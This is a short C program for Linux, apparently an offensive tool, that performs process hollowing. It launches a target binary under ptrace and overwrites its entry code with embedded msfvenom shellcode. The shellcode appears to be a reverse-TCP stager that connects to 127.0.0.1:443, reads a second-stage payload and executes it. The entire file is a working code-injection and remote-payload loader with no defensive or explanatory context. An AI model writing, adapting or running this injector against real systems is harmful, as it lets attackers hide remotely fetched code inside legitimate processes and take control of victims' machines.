#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>

int hollow(const char *bin);

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <bin_path>\n", argv[0]);
        return 1;

    }

    char *binPath = argv[1];    
    return hollow(binPath);

}

int hollow(const char *bin) {
    // msfvenom shellcode
    unsigned char shellcode[] = 
        "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
        "\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
        "\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
        "\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
        "\x01\xbb\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
        "\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
        "\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
        "\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
        "\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
        "\x78\xed\xff\xe6";

    size_t shellcodeLen = sizeof(shellcode);
    char *params[] = {(char*)bin, NULL};
    pid_t procID = fork();
    if (procID == 0) {
        // Child
        if (ptrace(PTRACE_TRACEME, NULL, NULL, NULL) == -1) {
            perror("Can't attach");
            _exit(1);

        }

        execve(bin, params, 0);
        perror("Can't execve");
        _exit(1);

    }

    printf("Child PID: %d\n", (int)procID);
    if (waitpid(procID, 0, 0) == -1) {
        perror("Can't wait for child");
        goto detach;

    }

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, procID, NULL, &regs) == -1) {
        perror("Can't get child regs");
        goto detach;

    }

    unsigned long address = regs.rip;
    printf("Child RIP: 0x%lx\n", address);

    for (int i = 0; i < shellcodeLen; i += sizeof(unsigned long)) {
        unsigned long w = ((unsigned long*)shellcode)[(i / sizeof(unsigned long))];
        if (ptrace(PTRACE_POKETEXT, procID, address + i, w) == -1) {
            perror("Can't POKETEXT");
            goto detach;

        }

        printf("Writing PID: %d - Address: 0x%lx - Buffer: 0x%lx\n", (int)procID, address + i, w);

    }

    ptrace(PTRACE_DETACH, procID, NULL, NULL);
    return 0;

    detach:
        ptrace(PTRACE_DETACH, procID, NULL, NULL);
        return 1;

};
